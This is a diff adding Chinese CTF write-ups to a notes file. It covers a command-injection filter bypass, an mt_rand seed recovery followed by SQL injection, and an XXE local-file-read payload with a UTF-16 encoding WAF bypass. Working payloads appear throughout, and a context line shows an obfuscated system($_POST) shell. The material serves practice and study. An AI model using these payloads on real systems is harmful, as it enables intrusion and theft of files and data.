@@ -10025,6 +10025,201 @@ $___($$____[_]);										// system($_POST[_])
 
 ![image-20240518175054866](CTF.assets/image-20240518175054866.png)
 
+## BUUOJ EasyBypass
+
+源码审计题，拿到源码
+
+```php
+<?php
+
+highlight_file(__FILE__);
+
+$comm1 = $_GET['comm1'];
+$comm2 = $_GET['comm2'];
+
+
+if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
+    $comm1 = "";
+if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
+    $comm2 = "";
+
+$flag = "#flag in /flag";
+
+$comm1 = '"' . $comm1 . '"';
+$comm2 = '"' . $comm2 . '"';
+
+$cmd = "file $comm1 $comm2";
+system($cmd);
+?>
+```
+
+首先`$comm2`的正则中存在`||`，那么不管匹配什么都会为空（恒为空），然后`$comm1`是可以输入`;`和空格的，结合最后得到的命令应该长这样
+
+```
+file "$comm1 comm2"; 
+# 由于comm2恒为空，得：
+file "$comm1"
+# 这里$comm1是没有任何的实体化的，那么只要闭合掉双引号即可，payload：
+file "comm1";tac /fla?;"" ---> comm1";tac /fla?;"
+```
+
+## BUUOJ [MRCTF2020]Ezaudit
+
+扫目录没扫出东西，后面看了一下题目名为Ezaudit，预估是代码审计，输入`/www.zip`，成功拿到源码
+
+代码不难，主要是要拿到`$Private_key`，后面就是SQL注入了，这里很明显注入点在`$password`，直接输入万能密码就行
+
+```php
+<?php
+header('Content-type:text/html; charset=utf-8');
+error_reporting(0);
+if (isset($_POST['login'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $Private_key = $_POST['Private_key'];
+    if (($username == '') || ($password == '') || ($Private_key == '')) {
+        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
+        header('refresh:2; url=login.html');
+        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
+        exit;
+    } else if ($Private_key != '*************') {
+        header('refresh:2; url=login.html');
+        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
+        exit;
+    } else {
+        if ($Private_key === '************') {
+            $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'" . ';';
+            $link = mysql_connect("localhost", "root", "root");
+            mysql_select_db("test", $link);
+            $result = mysql_query($getuser);
+            while ($row = mysql_fetch_assoc($result)) {
+                echo "<tr><td>" . $row["username"] . "</td><td>" . $row["flag"] . "</td><td>";
+            }
+        }
+    }
+
+}
+// genarate public_key
+function public_key($length = 16)
+{
+    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $public_key = '';
+    for ($i = 0; $i < $length; $i++)
+        $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+}
+
+//genarate private_key
+function private_key($length = 12)
+{
+    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $private_key = '';
+    for ($i = 0; $i < $length; $i++)
+        $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    return $private_key;
+}
+
+$Public_key = public_key();
+//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
+```
+
+注释这里给出了公钥；一开始还没反应过来是`mt_rand()`种子爆破，还是不够敏感，其实在看到`mt_rand()`的时候就应该反应过来的，翻了一下[GWCTF 2019]枯燥的抽奖的WP，将随机数转化为`php_mt_seed`可以看懂的数据那个脚本稍微改一下，具体为什么要这么改我也不知道，好在代码量少，凭感觉改对了
+
+```php
+<?php
+error_reporting(0);
+$str_long1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+$string='KVQP0LdJKRaV3n9D';
+$len1=16;
+for ( $i = 0; $i < $len1; $i++ ){
+    $pos=strpos($str_long1,$string[$i]);
+    echo $pos." ".$pos." 0 61 " ;
+}
+```
+
+将得到的数据直接跑就行
+
+![image-20240519162351773](CTF.assets/image-20240519162351773.png)
+
+这里要注意看版本，跑出来的种子只能在`PHP 5.2.1 - 7.0`上用，所以在跑私钥的时候也要把版本降下来
+
+```
+seed = 0x69cf57fb = 1775196155 (PHP 5.2.1 to 7.0.x; HHVM)
+```
+
+```php
+<?php
+mt_srand(1775196155);
+function public_key($length = 16)
+{
+    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $public_key = '';
+    for ($i = 0; $i < $length; $i++)
+        $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    echo $public_key;
+}
+public_key();			// KVQP0LdJKRaV3n9D
+echo "\n";
+
+function private_key($length = 12)
+{
+    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $private_key = '';
+    for ($i = 0; $i < $length; $i++)
+        $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    echo $private_key;			
+}
+private_key();			// XuNhoueCDCGc
+```
+
+最后将得到的私钥`XuNhoueCDCGc`输入配合万能密码登录即可
+
+```
+username: xxx
+password: 1'||'1
+private_ke: XuNhoueCDCGc
+```
+
+## BUUOJ [CSAWQual 2019]Web_Unagi
+
+> 参考：https://www.cnblogs.com/20175211lyz/p/11413335.html
+
+看给的示例很明显是XXE注入，输入payload发现有waf，参考XXE绕过姿势找到一个使用编码绕过
+
+```
+cat payload.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml
+```
+
+最后payload：
+
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [
+        <!ENTITY rabbit SYSTEM "file:///flag" >
+        ]>
+<users>
+    <user>
+        <username>&rabbit;</username>
+        <password>&rabbit;</password>
+        <name>&rabbit;</name>
+        <email>&rabbit;</email>
+        <group>&rabbit;</group>
+        <intro>&rabbit;</intro>
+    </user>
+    <user>
+        <username>bob</username>
+        <password>passwd2</password>
+        <name> Bob</name>
+        <email>bob@fakesite.com</email>
+        <group>CSAW2019</group>
+    </user>
+</users>
+```
+
+
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
